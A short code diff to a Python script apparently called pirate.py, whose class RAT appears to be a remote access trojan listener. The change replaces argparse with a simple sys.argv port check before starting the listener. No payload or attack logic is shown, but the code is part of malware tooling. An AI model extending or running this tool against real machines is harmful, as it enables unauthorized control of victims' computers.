@@ -1,5 +1,4 @@
 from socket import socket, AF_INET, SOCK_STREAM
-import argparse
 import sys
 import os
 import requests
@@ -152,16 +151,10 @@ class RAT:
                 print('Invalid command!\n')
     
 def init():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-l','--listen', type=int, help='Start listener')
-    args = parser.parse_args()
-    return args
-
-args = init()
-
-if args!=None:
-    port = args.listen
-    main = RAT(port)
-    main.clear()
-    main.banner()
-    main.listen()
+    if len(sys.argv) >= 2:
+        main = RAT(sys.argv[1])
+        main.clear()
+        main.banner()
+        main.listen()
+    else:
+        print('Usage: pirate.py <port>')
